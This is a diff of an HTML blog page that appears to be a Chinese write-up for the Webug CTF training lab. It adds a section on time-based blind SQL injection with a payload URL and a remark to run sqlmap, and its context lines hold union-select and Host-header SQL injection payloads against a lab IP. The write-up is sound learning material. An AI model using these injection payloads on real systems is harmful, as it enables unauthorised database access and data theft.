@@ -88,7 +88,8 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/ctf/1.png">
 <meta property="og:image" content="http://yoursite.com/ctf/2.png">
-<meta property="og:updated_time" content="2018-04-22T11:22:32.424Z">
+<meta property="og:image" content="http://yoursite.com/ctf/盲注.png">
+<meta property="og:updated_time" content="2018-04-22T12:18:21.609Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="webug wp">
 <meta name="twitter:description" content="0x01 基础 普通的GET注入一道简单的sql注入   暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1">
@@ -396,7 +397,8 @@
 <li>获取flag：<br>Host: union select 1,2,3,flag from `flag`#</li>
 </ul>
 <ol>
-<li><p>APK里面有flag<br>做不来做不来。看盛大佬的wp吧<br>我说下我是这么做的。。开了个鼠标连点器。。。毕竟只需要点300次嘛 强行get flag</p>
+<li>APK里面有flag<br>做不来做不来。看盛大佬的wp吧<br>我说下我是这么做的。。开了个鼠标连点器。。。毕竟只需要点300次嘛 强行get flag</li>
+<li><p>时间盲注<br>先判断database的长度<br><code>http://222.18.158.245:6022/pentest/test/time/?type=2 and length(database())=12 #</code><br>直接扔sqslmap跑就行了。。。<br><img src="/ctf/盲注.png" alt="盲注"></p>
 </li>
 <li><p>DZ论坛<br>这个页面太。。。</p>
 </li>
